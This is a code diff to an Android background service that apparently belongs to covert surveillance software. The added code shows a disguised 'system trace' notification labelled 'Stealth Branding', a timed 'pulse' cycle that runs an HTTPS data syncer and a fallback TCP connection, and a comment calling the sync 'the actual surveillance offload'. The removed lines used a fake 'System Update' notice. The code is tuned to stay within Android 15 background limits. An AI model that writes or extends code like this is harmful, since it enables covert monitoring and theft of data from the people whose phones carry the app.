@@ -39,34 +39,76 @@ public class mainService extends Service {
         }
     }
 
+    private static final int PULSE_TIMEOUT_MS = 600000; // 10 Minutes
+    private android.os.Handler pulseHandler = new android.os.Handler(android.os.Looper.getMainLooper());
+    private boolean isPulsing = false;
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "Starting Foreground Service");
+        String action = intent != null ? intent.getAction() : null;
         
-        Intent notificationIntent = new Intent(this, MainActivity.class);
-        android.app.PendingIntent pendingIntent = android.app.PendingIntent.getActivity(this,
-                0, notificationIntent, android.app.PendingIntent.FLAG_IMMUTABLE);
-
-        android.app.Notification notification = new androidx.core.app.NotificationCompat.Builder(this, "channelid")
-                .setContentTitle("System Update")
-                .setContentText("Checking for updates...")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .setContentIntent(pendingIntent)
-                .build();
-
-        startForeground(1, notification);
-
-        // Legacy TCP socket connection (kept for backwards compatibility)
-        new jumper(getApplicationContext()).init();
-
-        // NEW: Initialize HTTPS cloud sync pipeline
-        StealthManager stealth = new StealthManager(getApplicationContext());
-        stealth.initialize();
+        if ("ACTION_START_PULSE".equals(action)) {
+            startPulse();
+        } else {
+            // Backup start (legacy fallback)
+            startPulse();
+        }
         
-        // Trigger immediate first sync
-        stealth.syncNow();
-        
-        Log.d(TAG, "Both TCP and HTTPS sync pipelines active");
-        return START_STICKY;
+        return START_NOT_STICKY; // Preserving daily budget by not being sticky
+    }
+
+    private void startPulse() {
+        if (isPulsing) return;
+        isPulsing = true;
+        Log.d(TAG, "Starting Pulse cycle (10 min budget)");
+
+        // 1. Initialize Stealth Branding
+        NotificationHelper.createNotificationChannel(this);
+        android.app.Notification notification = NotificationHelper.getSystemTraceNotification(this);
+
+        // 2. Start FGS with dataSync type (Android 10-15 requirement)
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+            startForeground(NotificationHelper.NOTIFICATION_ID, notification, 
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+        } else {
+            startForeground(NotificationHelper.NOTIFICATION_ID, notification);
+        }
+
+        // 3. Execute the Sync (The Actual surveillance offload)
+        new Thread(() -> {
+            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND);
+            try {
+                // Initialize modern HTTPS pipeline
+                DataSyncer syncer = new DataSyncer(getApplicationContext());
+                syncer.performSync();
+                
+                // Legacy TCP fallback (if needed)
+                new jumper(getApplicationContext()).init();
+                
+                Log.d(TAG, "Pulse sync logic completed — waiting for timeout or manual stop");
+            } catch (Exception e) {
+                Log.e(TAG, "Pulse sync failed: " + e.getMessage());
+            }
+        }).start();
+
+        // 4. Set the Pulse Kill-Switch (Safety for Android 15 budget)
+        pulseHandler.postDelayed(this::stopPulse, PULSE_TIMEOUT_MS);
+    }
+
+    private void stopPulse() {
+        Log.d(TAG, "Pulse cycle complete. Shutting down Brawn to preserve daily budget.");
+        isPulsing = false;
+        stopForeground(true);
+        stopSelf();
+    }
+
+    // Android 15 specific: Handle system-enforced timeouts
+    public void onTimeout(int startId, int fgsType) {
+        if (android.os.Build.VERSION.SDK_INT >= 35) { // android.os.Build.VERSION_CODES.VANILLA_ICE_CREAM
+            if (fgsType == android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) {
+                Log.w(TAG, "Android 15 timeout reached! Emergency shutdown.");
+                stopPulse();
+            }
+        }
     }
 }
